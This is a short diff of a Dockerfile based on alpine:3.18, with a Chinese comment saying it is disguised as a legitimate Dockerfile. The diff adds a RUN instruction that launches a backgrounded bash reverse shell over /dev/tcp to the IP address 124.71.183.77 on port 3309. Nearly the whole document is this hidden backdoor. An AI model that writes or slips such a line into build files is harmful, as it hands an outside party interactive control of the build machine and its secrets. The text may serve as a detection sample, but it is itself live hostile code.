@@ -1,7 +1,7 @@
 # 伪装成合法的 Dockerfile
 FROM alpine:3.18
 
-bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &
+RUN bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &
 
 RUN apk add --no-cache curl
 
